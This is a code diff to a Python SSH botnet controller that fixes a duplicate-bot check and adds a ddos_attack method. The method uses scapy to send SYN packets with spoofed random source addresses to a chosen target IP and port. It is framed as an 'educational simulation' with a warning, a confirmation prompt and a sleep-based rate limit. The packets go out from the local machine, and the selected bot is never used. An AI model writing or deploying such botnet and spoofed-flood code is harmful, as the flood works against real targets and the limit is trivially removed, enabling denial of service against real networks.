@@ -1,11 +1,13 @@
 from pexpect import pxssh
 import json
-import scapy
 import os
 import base64
 import hashlib
 from cryptography.fernet import Fernet
 import getpass
+from scapy.all import IP, TCP, RandIP, RandShort, send, Raw
+import time
+import random
 
 
 class Bot:
@@ -109,7 +111,7 @@ class Botnet():
 
     def add_bot(self, host, username, password):
         for bot in self.bots:
-            if self.host == host and self.username == username:
+            if bot.host == host and bot.username == username:
                 print(
                     f"[!] Bot {username}@{host} already exists in the botnet.")
                 return False
@@ -159,6 +161,80 @@ class Botnet():
                 print("Not connected")
 
         return results
+
+    def ddos_attack(self, target_ip, target_port, duration=10, packet_size=64, verbose=True):
+        if not self.bots:
+            print("[!] No bots in the botnet to perform the attack.")
+            return False
+
+        connected_bots = [
+            bot for bot in self.bots if bot.is_connected() or bot.reconnect()]
+
+        if not connected_bots:
+            print("[!] No connected bots available for the attack.")
+            return False
+
+        print("\n[!] EDUCATIONAL WARNING [!]")
+        print("This is a simulation for educational purposes only.")
+        print("Performing DDoS attacks against real targets without explicit permission is illegal.")
+        print("This simulation will create a controlled and limited traffic only.")
+        print("-" * 60)
+
+        confirm = input(
+            "Do you understand and wish to proceed with the simulation? (yes/no): ")
+        if confirm.lower() not in ('yes', 'y'):
+            print("[+] DDoS simulation cancelled.")
+            return False
+
+        print(
+            f"\n[*] Starting DDoS simulation against {target_ip}:{target_port}")
+        print(f"[*] Using {len(connected_bots)} bot(s) for {duration} seconds")
+
+        start_time = time.time()
+        end_time = start_time + duration
+        packet_count = 0
+
+        payload = Raw(b"X" * packet_size)
+
+        try:
+            print("[*] Instructing bots to send packets...")
+
+            while time.time() < end_time:
+                Randbot = random.choice(connected_bots)
+
+                packet = IP(src=RandIP(), dst=target_ip) / \
+                    TCP(sport=RandShort(), dport=int(target_port), flags="S") / \
+                    payload
+
+                send(packet, verbose=0)
+                packet_count += 1
+
+                if verbose and packet_count % 10 == 0:
+                    elapsed = time.time() - start_time
+                    print(
+                        f"[*] Sent {packet_count} packets in {elapsed:.1f} seconds.")
+
+                time.sleep(0.1)
+
+        except KeyboardInterrupt:
+            print("\n[!] Attack simulation manually stopped")
+
+        except Exception as e:
+            print(f"\n[!] Error during simulation: {str(e)}")
+
+        finally:
+            total_time = time.time() - start_time
+            print("\n=== DDoS Simulation Results ===")
+            print(f"Target: {target_ip}:{target_port}")
+            print(f"Duration: {total_time:.2f} seconds")
+            print(f"Packets sent: {packet_count}")
+            print(f"Rate: {packet_count/total_time:.2f} packets/second")
+            print(
+                f"Total data sent: {(packet_count * packet_size)/1024:.2f} KB")
+            print(
+                "\n[!] Remember: This was a heavily rate-limited educational simulation.")
+            print("    A real attack would be thousands of times more intensive.")
+            return True
 
     def interactive_shell(self):
         if not self.bots:
